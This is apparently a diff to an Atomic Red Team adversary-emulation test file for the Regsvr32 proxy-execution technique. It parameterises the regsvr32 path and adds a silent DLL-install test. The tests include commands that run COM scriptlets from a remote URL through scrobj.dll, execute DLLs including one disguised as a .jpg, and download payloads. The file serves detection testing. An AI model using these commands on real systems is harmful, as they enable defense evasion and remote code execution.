@@ -12,6 +12,14 @@ atomic_tests:
       description: Name of the local file, include path.
       type: Path
       default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
+    regsvr32path:
+      description: Default location of Regsvr32.exe
+      type: Path
+      default: C:\Windows\system32
+    regsvr32name:
+      description: Default name of Regsvr32.exe
+      type: String
+      default: regsvr32.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -23,7 +31,7 @@ atomic_tests:
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
   executor:
     command: |
-      regsvr32.exe /s /u /i:#{filename} scrobj.dll
+      #{regsvr32path}\#{regsvr32name} /s /u /i:#{filename} scrobj.dll
     name: command_prompt
 
 - name: Regsvr32 remote COM scriptlet execution
@@ -38,9 +46,17 @@ atomic_tests:
       description: URL to hosted sct file
       type: Url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
+    regsvr32path:
+      description: Default location of Regsvr32.exe
+      type: Path
+      default: C:\Windows\system32
+    regsvr32name:
+      description: Default name of Regsvr32.exe
+      type: String
+      default: regsvr32.exe
   executor:
     command: |
-      regsvr32.exe /s /u /i:#{url} scrobj.dll
+      #{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
     name: command_prompt
 
 - name: Regsvr32 local DLL execution
@@ -54,6 +70,14 @@ atomic_tests:
       description: Name of DLL to Execute, DLL Should export DllRegisterServer
       type: Path
       default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+    regsvr32path:
+      description: Default location of Regsvr32.exe
+      type: Path
+      default: C:\Windows\system32
+    regsvr32name:
+      description: Default name of Regsvr32.exe
+      type: String
+      default: regsvr32.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -65,7 +89,7 @@ atomic_tests:
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
   executor:
     command: |
-      IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
+      IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
     name: command_prompt
 
 - name: Regsvr32 Registering Non DLL
@@ -81,6 +105,14 @@ atomic_tests:
       description: Path to renamed dll file to be registered
       type: Path
       default: '%temp%\shell32.jpg'
+    regsvr32path:
+      description: Default location of Regsvr32.exe
+      type: Path
+      default: C:\Windows\system32
+    regsvr32name:
+      description: Default name of Regsvr32.exe
+      type: String
+      default: regsvr32.exe
   dependency_executor_name: command_prompt 
   dependencies: # (optional)
     - description: |
@@ -93,6 +125,35 @@ atomic_tests:
     name: command_prompt
     elevation_required: false 
     command: |
-      regsvr32 /s #{dll_file}
+      #{regsvr32path}\#{regsvr32name} /s #{dll_file}
     cleanup_command: |
-      regsvr32 /U /s #{dll_file}
+      #{regsvr32path}\#{regsvr32name} /U /s #{dll_file}
+
+- name: Regsvr32 Silent DLL Install Call DllRegisterServer
+  auto_generated_guid: 9d71c492-ea2e-4c08-af16-c6994cdf029f
+  description: Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_name:
+      description: Name of DLL to Install
+      type: String
+      default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+    regsvr32path:
+      description: Default location of Regsvr32.exe
+      type: String
+      default: C:\Windows\system32
+    regsvr32name:
+      description: Default name of Regsvr32.exe
+      type: String
+      default: regsvr32.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
+    prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+    get_prereq_command: |-
+      New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+  executor:
+    command: '#{regsvr32path}\#{regsvr32name} /s /i #{dll_name}'
+    name: command_prompt
